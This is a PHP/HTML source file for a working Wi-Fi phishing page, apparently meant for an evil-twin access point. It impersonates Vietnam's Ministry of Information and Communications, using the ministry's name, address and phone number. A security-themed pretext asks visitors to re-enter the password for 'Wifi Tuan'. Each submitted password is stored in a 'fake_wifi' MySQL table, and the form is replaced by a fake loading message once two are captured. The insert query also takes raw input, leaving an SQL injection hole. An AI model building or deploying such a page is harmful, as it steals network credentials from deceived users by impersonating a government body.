<?php
    $host = 'localhost';
    $user = 'root';
    $pass = 'root';
    $db = 'fake_wifi';
    $connect = new mysqli($host, $user, $pass, $db);
    $result = $connect->query('SELECT * FROM wifi');
    if ($result instanceof mysqli_result and $result->num_rows >= 2)
    {
        echo '<em> Please wait for loading data .....  </em>';
        exit;
    }
	if (isset($_POST['submit']))
	{
		$pass = $_POST['pass'];
        // write to database
        if ($connect->query("INSERT INTO wifi(pass) VALUES('$pass')"))
        {
            header('Location: '.$_SERVER['PHP_SELF']);
            exit;
        }
	}
?>
<!DOCTYPE HTML>
<html>
	<head>
		<link rel="icon" href="/asset/img/signal_1.ico" />
		<link rel="stylesheet" href="/asset/dist/css/bootstrap.css" />
        <link rel="stylesheet" href="/asset/dist/css/bootstrap-theme.min.css" />
        <script src="/asset/jquery-1.12.4.min.js"></script>
        <script src="/asset/jquery.validate.min.js"></script>
		<script src="/asset/dist/js/bootstrap.min.js"></script>
		<style>
			.body
			{
				font-family: "Times New Roman", Times, serif;
			}
			.no-border-radius
			{
				border-radius: 0px;
            }
            .no-underline
            {
                text-decoration: none;
            }
            .no-underline:hover
            {
                text-decoration: none;
            }
		</style>
		<title> Cổng thông tin điện tử - MIC </title>
	</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-8 col-sm-offset-2">
					<form method="post" id="form-mic">
						<h3 class="text-muted"> Xác thực mật khẩu Wifi <em><strong>"Wifi Tuan"</strong></em> </h3>
						<div class="form-group">
							<a href="javascript:void(0)" data-toggle="popover" id="info-tip" class="no-underline"><span class="glyphicon glyphicon-signal"></span>&nbsp; Thông tin chi tiết </a>
						</div>
						<div class="form-group">
							<input type="text" class="form-control no-border-radius" placeholder="Vui lòng nhập mật khẩu WIFI của bạn" name="pass" autofocus />
						</div>
						<button type="submit" class="btn btn-primary" name="submit" value="submit"><strong><span class="glyphicon glyphicon-ok"></span>&nbsp; Xác nhận </strong></button>
					</form>
					<hr />
				</div>
			</div>
			<div class="row">
				<div class="col-sm-8 col-sm-offset-2">
					<footer>
						<em> CƠ QUAN CHỦ QUẢN: BỘ THÔNG TIN VÀ TRUYỀN THÔNG (MIC) </em><br />
						<em><strong> Địa chỉ</strong>: 18 Nguyễn Du, Hàng Bài, Hoàn Kiếm, Hà Nội </em><br />
						<em><strong> Điện thoại</strong> 04 3943 5602 </em>
					</footer>
				</div>
			</div>
		</div>
		<script>
		$(document).ready(function(){
			$(document).on('focus', 'a, button', function(){
				$(this).blur();
			});
		    $('[data-toggle="popover"]').popover({
		    	title: 'THÔNG BÁO TỪ NHÀ MẠNG',
		    	content: 'Để đảm bảo an toàn thông tin trên Internet, chúng tôi muốn bạn xác nhận mật khẩu Wifi của bạn để bảo vệ dữ liệu của bạn an toàn trước các Hacker và Virus xâm nhập qua Máy tính và SmartPhone !',
		    	trigger: 'hover'
            });
            //$('#info-tip').trigger('mouseover');
            $('#form-mic').validate({
                errorClass: 'text-danger',
                rules: {
                    pass: {
                        required: true,
                        minlength: 8
                    }
                },
                messages: {
                    pass: {
                        required: 'Bạn vui lòng nhập mật khẩu vào ô này',
                        minlength: 'Mật khẩu phải lớn hơn hoặc bằng 8 ký tự'
                    }
                }
            });
		});
		</script>
	</body>
</html>
